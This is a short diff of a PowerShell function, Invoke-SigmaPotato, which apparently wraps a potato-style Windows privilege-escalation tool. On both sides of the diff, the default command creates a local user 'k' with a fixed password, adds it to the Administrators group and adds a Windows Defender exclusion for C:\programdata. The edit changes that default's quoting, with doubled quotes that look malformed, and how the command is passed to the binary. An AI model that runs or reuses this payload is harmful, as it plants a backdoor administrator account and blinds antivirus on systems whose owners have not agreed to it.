@@ -27,7 +27,7 @@ function Invoke-SigmaPotato {
    [CmdletBinding()]
     Param (
         [String]
-        $Command = "net user k kopq@123 /add && net localgroup administrators k /add && powershell Add-MpPreference -ExclusionPath C:\programdata"
+        $Command = ""net user k kopq@123 /add && net localgroup administrators k /add && powershell Add-MpPreference -ExclusionPath C:\programdata""
 
     )
 
@@ -63,7 +63,7 @@ function Invoke-SigmaPotato {
     [Console]::SetOut($StringWriter)
 
     # Binary Namespace
-    [SigmaPotato]::Main("$Command")
+    [SigmaPotato]::Main($Command)
 
     [Console]::SetOut($OldConsoleOut)
     $StringWriter.ToString()
